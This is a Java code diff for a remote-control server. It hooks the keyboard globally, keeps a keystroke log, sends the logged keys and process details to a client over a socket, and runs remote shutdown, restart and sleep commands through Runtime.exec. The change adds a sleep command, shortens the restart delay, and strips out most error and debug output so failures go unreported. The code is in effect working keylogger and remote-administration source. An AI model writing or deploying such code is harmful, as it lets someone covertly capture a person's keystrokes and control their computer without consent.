@@ -2,17 +2,16 @@ import java.io.*;
 import java.net.ServerSocket;
 import java.util.Scanner;
 
-import javax.swing.JOptionPane;
 
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.dispatcher.SwingDispatchService;
 
-import model.KeyLog;
-import model.Server;
 import model.*;
 
 public class Main {
+	
 	private static KeyLog keyLog = new KeyLog();
+	
 	public static void main(String[] args) throws IOException {
 		GlobalScreen.setEventDispatcher(new SwingDispatchService());
 		int port = 6789;
@@ -44,6 +43,8 @@ public class Main {
 				else if(msg.equals("SHOW TEXT")) Showtext();
 				else if(msg.equals("SHUTDOWN")) Shutdown();
 				else if(msg.equals("RESTART")) Restart();
+				else if(msg.equals("SLEEP")) Sleep();
+				else if(msg.equals("EXIT")) isRunning = false;
 				else isRunning = false;
 				
 			} catch(Exception e1) {
@@ -122,13 +123,11 @@ public class Main {
 				String ID = info.substring(pFirstSpace + 1, pLastSpace - 1);
 				ID = ID.replaceAll("\\s", "");
 				String count = info.substring(pLastSpace);
-				//System.out.println(name + " " + ID + " " + count);
 				try {
 					Server.out.write(name);
 					Server.out.newLine();
 					Server.out.flush();
 				} catch (IOException e) {
-					e.printStackTrace();
 				}
 				
 				try {
@@ -136,7 +135,6 @@ public class Main {
 					Server.out.newLine();
 					Server.out.flush();
 				} catch (IOException e) {
-					e.printStackTrace();
 				}
 				
 				try {
@@ -144,7 +142,6 @@ public class Main {
 					Server.out.newLine();
 					Server.out.flush();
 				} catch (IOException e) {
-					e.printStackTrace();
 				}
 				
 			}
@@ -173,12 +170,8 @@ public class Main {
 			Server.out.flush();
 			keyLog.keylog = "";
 		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
 		}		
 	}
-	
-	
 	
 	private static void Shutdown()
 	{
@@ -196,12 +189,8 @@ public class Main {
 	    }
 	    catch(IOException e)
 	    {
-	       System.out.println("Exception: " +e);
 	    }
 	}
-	
-	
-	
 	
 	
 	private static void Restart() {
@@ -214,12 +203,29 @@ public class Main {
 		}
 	    try
 	    {
-	       System.out.println("Restarting the PC after 20 seconds.");
-	       runtime.exec("shutdown -r -t 20");
+	       System.out.println("Restarting the PC after 10 seconds.");
+	       runtime.exec("shutdown -r -t 10");
 	    }
 	    catch(IOException e)
 	    {
-	       System.out.println("Exception: " +e);
+	    }
+	}
+	
+	private static void Sleep() {
+		Runtime runtime = Runtime.getRuntime() ;
+		try {
+			Server.server.close();
+			Server.client.close();
+		} catch (IOException e1) {
+			e1.printStackTrace();
+		}
+	    try
+	    {
+	       System.out.println("Sleep the PC after 10 seconds.");
+	       runtime.exec("Rundll32.exe powrprof.dll, SetSuspendState Sleep");
+	    }
+	    catch(IOException e)
+	    {
 	    }
 	}
 }
